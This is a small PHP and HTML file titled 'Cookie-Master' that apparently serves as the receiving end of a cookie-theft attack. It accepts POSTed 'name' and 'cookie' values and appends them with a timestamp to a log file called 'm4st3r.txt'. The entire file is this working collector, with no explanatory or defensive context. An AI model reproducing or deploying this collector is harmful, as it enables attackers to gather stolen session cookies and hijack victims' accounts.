<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie-Master</title>
</head>
<body>
    <form action="index.php" method="post">
    <input type="hidden" name="name">
    <input type="hidden" name="cookie">
    </form>
</body>
</html>
<?php
$name = $_POST['name'];
$cookie = $_POST['cookie'];
$fifo = fopen('m4st3r.txt', 'a');

if (is_null($cookie) == FALSE) {
    date_default_timezone_set("Asia/Dhaka");
    fwrite($fifo, "----- [".$name."] -----\nTime : ".date('h:i:s A')."\n");
    fwrite($fifo, $cookie);
    fwrite($fifo, "\n----- [END] -----\n\n");

    fclose($fifo);
}

?>
